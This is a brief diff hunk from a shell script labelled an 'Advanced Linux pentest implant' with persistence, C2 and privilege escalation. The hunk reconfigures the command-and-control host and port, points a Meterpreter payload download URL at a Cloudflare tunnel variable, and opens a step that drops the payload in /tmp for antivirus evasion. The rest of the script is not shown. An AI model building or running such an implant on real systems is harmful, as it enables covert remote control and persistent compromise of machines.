@@ -2,9 +2,9 @@
 # Advanced Linux pentest implant - Persistence + C2 + Privesc
 
 # Config
-C2_IP="192.168.0.127"
-C2_PORT="4444"
-METER_URL="http://${C2_IP}:8080/meterpreter.elf"
+C2_IP="localhost"
+C2_PORT="8080"
+METER_URL="$CLOUDFARE_URL:8080/meterpreter.elf"
 
 # 1. Drop Meterpreter (AV evasion)
 cd /tmp
